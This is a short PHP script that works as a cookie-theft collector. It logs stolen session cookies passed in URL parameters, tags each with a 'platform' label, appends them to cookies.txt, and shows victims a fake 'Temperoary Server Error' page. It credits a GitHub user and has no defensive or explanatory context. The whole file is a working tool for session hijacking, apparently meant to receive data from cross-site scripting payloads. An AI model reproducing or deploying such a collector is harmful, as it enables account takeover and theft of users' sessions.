<?php
if(isset($_GET['cookie'])) {
	$cookie = $_GET['cookie'];
	if (isset($_GET['platform'])) {
		$file = fopen('cookies.txt', 'a');
		fwrite($file, "[".$_GET['platform']."] ".$cookie."\n");
		fclose($file);
	} else {
		$file = fopen('cookies.txt', 'a');
		fwrite($file, "[UNKNOWN] ".$cookie."\n");
		fclose($file);
	}
}
// made by raptor1337 | github.com/raptor1337
?>

<!DOCTYPE html>
<html>
<head>
	<title>Temperoary Server Error</title>
</head>
<body>
	<h1>Temperoary Server Error</h1>
	<h3>Sorry for the Inconvenience</h3>
</body>
</html>